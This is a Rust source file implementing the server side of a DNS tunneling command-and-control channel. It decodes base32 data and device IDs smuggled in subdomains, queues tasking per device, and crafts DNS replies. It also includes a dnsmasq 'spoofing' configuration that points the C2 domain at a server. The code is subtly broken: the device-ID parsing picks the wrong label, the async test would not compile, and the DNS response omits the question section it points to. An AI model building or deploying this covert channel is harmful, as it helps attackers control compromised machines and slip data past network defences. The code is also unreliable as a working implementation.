use anyhow::Result;
use dashmap::DashMap;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;
use tokio::net::UdpSocket;
use tracing::{debug, error, info};

// DNS protocol simplified for C2 tunneling
// Format: base32-encoded command in subdomain
// Response: encoded in DNS record TTL or A record IP

#[derive(Debug, Clone)]
pub struct DnsTunnelMessage {
    pub device_id: String,
    pub data: Vec<u8>,
    pub sequence: u32,
}

pub struct DnsTunnelEndpoint {
    // UDP socket for DNS
    socket: Arc<UdpSocket>,
    
    // Track pending device requests
    pending_requests: Arc<DashMap<String, Vec<u8>>>,
    
    // Domain base (e.g., "c2.example.com")
    domain_base: String,
}

impl DnsTunnelEndpoint {
    pub async fn new(listen_addr: &str, domain_base: String) -> Result<Self> {
        let socket = Arc::new(UdpSocket::bind(listen_addr).await?);
        info!("DNS tunnel listening on: {}", listen_addr);

        Ok(Self {
            socket,
            pending_requests: Arc::new(DashMap::new()),
            domain_base,
        })
    }

    /// Start DNS listener
    pub async fn start(&self) -> Result<()> {
        let mut buf = [0; 512];

        loop {
            let (n, addr) = self.socket.recv_from(&mut buf).await?;
            let data = &buf[..n];

            // Parse DNS query
            match self.parse_dns_query(data) {
                Ok((query_domain, query_id)) => {
                    debug!("DNS query from {}: {}", addr, query_domain);
                    
                    // Extract encoded data from subdomain
                    if let Ok((device_id, payload)) = self.decode_dns_subdomain(&query_domain) {
                        self.pending_requests.insert(device_id.clone(), payload);
                        
                        // Send response
                        if let Err(e) = self.send_dns_response(&addr, query_id, &device_id).await {
                            error!("Failed to send DNS response: {}", e);
                        }
                    }
                }
                Err(e) => {
                    debug!("Invalid DNS query: {}", e);
                }
            }
        }
    }

    /// Parse DNS query packet
    fn parse_dns_query(&self, data: &[u8]) -> Result<(String, u16)> {
        if data.len() < 12 {
            return Err(anyhow::anyhow!("DNS packet too short"));
        }

        // Transaction ID (first 2 bytes)
        let query_id = u16::from_be_bytes([data[0], data[1]]);

        // Flags (bytes 2-3): check if this is a query
        let flags = u16::from_be_bytes([data[2], data[3]]);
        if (flags & 0x8000) != 0 {
            return Err(anyhow::anyhow!("Not a query"));
        }

        // Parse QNAME (domain name)
        let mut pos = 12;
        let mut labels = Vec::new();

        while pos < data.len() {
            let len = data[pos] as usize;
            if len == 0 {
                break;
            }
            pos += 1;

            if pos + len > data.len() {
                return Err(anyhow::anyhow!("Invalid QNAME"));
            }

            let label = String::from_utf8_lossy(&data[pos..pos + len]).to_string();
            labels.push(label);
            pos += len;
        }

        let domain = labels.join(".");
        Ok((domain, query_id))
    }

    /// Decode device ID and payload from DNS subdomain
    /// Format: <base32_encoded_data>.<seq>.<device_id>.<domain_base>
    fn decode_dns_subdomain(&self, domain: &str) -> Result<(String, Vec<u8>)> {
        // Split domain by dots
        let parts: Vec<&str> = domain.split('.').collect();

        // Expected format: [data..., device_id, c2, example, com]
        if parts.len() < 3 {
            return Err(anyhow::anyhow!("Invalid DNS subdomain format"));
        }

        // Extract device ID (second to last before domain base)
        let device_id = parts[parts.len() - 3].to_string();

        // Extract encoded payload (everything before device_id)
        let payload_parts = &parts[..parts.len() - 3];
        let encoded_payload = payload_parts.join("");

        // Decode from base32
        let payload = Self::base32_decode(&encoded_payload)?;

        Ok((device_id, payload))
    }

    /// Send DNS response
    async fn send_dns_response(&self, addr: &SocketAddr, query_id: u16, device_id: &str) -> Result<()> {
        // Build minimal DNS response
        let mut response = Vec::new();

        // Transaction ID (echo back)
        response.extend_from_slice(&query_id.to_be_bytes());

        // Flags: response (0x8000) + no error (0x0000)
        response.extend_from_slice(&[0x84, 0x00]);

        // Question count (1)
        response.extend_from_slice(&[0x00, 0x01]);

        // Answer count (1)
        response.extend_from_slice(&[0x00, 0x01]);

        // Authority count (0)
        response.extend_from_slice(&[0x00, 0x00]);

        // Additional count (0)
        response.extend_from_slice(&[0x00, 0x00]);

        // Echo back the question section (simplified)
        // In production, properly reconstruct the question

        // Answer section: A record pointing to beacon server
        // TTL: 3600 (or encode data in TTL)
        response.extend_from_slice(&[0xc0, 0x0c]); // Pointer to domain name
        response.extend_from_slice(&[0x00, 0x01]); // Type A
        response.extend_from_slice(&[0x00, 0x01]); // Class IN
        response.extend_from_slice(&[0x00, 0x00, 0x0e, 0x10]); // TTL 3600

        // RDLENGTH: 4 bytes
        response.extend_from_slice(&[0x00, 0x04]);

        // RDATA: IP address (can encode data here)
        // For demo: return 192.168.1.1
        response.extend_from_slice(&[192, 168, 1, 1]);

        self.socket.send_to(&response, addr).await?;
        debug!("DNS response sent to: {}", addr);

        Ok(())
    }

    /// Base32 decode helper
    fn base32_decode(data: &str) -> Result<Vec<u8>> {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

        let data = data.to_uppercase();
        let mut result = Vec::new();
        let mut buffer = 0u32;
        let mut bits = 0;

        for ch in data.chars() {
            if let Some(idx) = ALPHABET.iter().position(|&b| b == ch as u8) {
                buffer = (buffer << 5) | (idx as u32);
                bits += 5;

                if bits >= 8 {
                    bits -= 8;
                    result.push((buffer >> bits) as u8);
                    buffer &= (1 << bits) - 1;
                }
            }
        }

        Ok(result)
    }

    /// Base32 encode helper
    pub fn base32_encode(data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

        let mut result = String::new();
        let mut buffer = 0u32;
        let mut bits = 0;

        for &byte in data {
            buffer = (buffer << 8) | (byte as u32);
            bits += 8;

            while bits >= 5 {
                bits -= 5;
                let idx = ((buffer >> bits) & 0x1f) as usize;
                result.push(ALPHABET[idx] as char);
            }
        }

        if bits > 0 {
            let idx = ((buffer << (5 - bits)) & 0x1f) as usize;
            result.push(ALPHABET[idx] as char);
        }

        result
    }

    /// Get pending data for device
    pub async fn get_pending_data(&self, device_id: &str) -> Option<Vec<u8>> {
        self.pending_requests.remove(device_id).map(|(_, v)| v)
    }

    /// Queue response data for device (via DNS TXT record or IP list)
    pub async fn queue_response(&self, device_id: &str, data: Vec<u8>) -> Result<()> {
        // Store for next DNS query from device
        self.pending_requests.insert(device_id.to_string(), data);
        Ok(())
    }
}

// ============================================================================
// DNSMASQ CONFIGURATION (for spoofing)
// ============================================================================

pub fn generate_dnsmasq_config() -> String {
    r#"
# Dnsmasq configuration for DNS tunnel C2

# Listen on all interfaces
listen-address=0.0.0.0

# Port 53
port=53

# Log all DNS queries
log-queries
log-facility=/var/log/dnsmasq.log

# Spoof all subdomains of c2.example.com to point to C2 server
address=/c2.example.com/192.168.1.100

# Set TTL for all responses (can encode data here)
local-ttl=3600

# Cache size
cache-size=10000

# No DNSSEC validation
dnssec-check-unsigned=no

# Forward to upstream nameserver
server=8.8.8.8
"#.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_encode_decode() {
        let original = b"hello world";
        let encoded = DnsTunnelEndpoint::base32_encode(original);
        let decoded = DnsTunnelEndpoint::base32_decode(&encoded).unwrap();
        assert_eq!(original, decoded.as_slice());
    }

    #[test]
    fn test_dns_subdomain_decode() {
        let endpoint = DnsTunnelEndpoint::new("127.0.0.1:5353", "c2.example.com".to_string())
            .await
            .unwrap();

        // Format: JBSWY3DPEA.device123.c2.example.com
        // Should extract device_id and payload
        let (device_id, _payload) = endpoint.decode_dns_subdomain("JBSWY3DPEA.device123.c2.example.com")
            .unwrap();
        
        assert_eq!(device_id, "device123");
    }
}
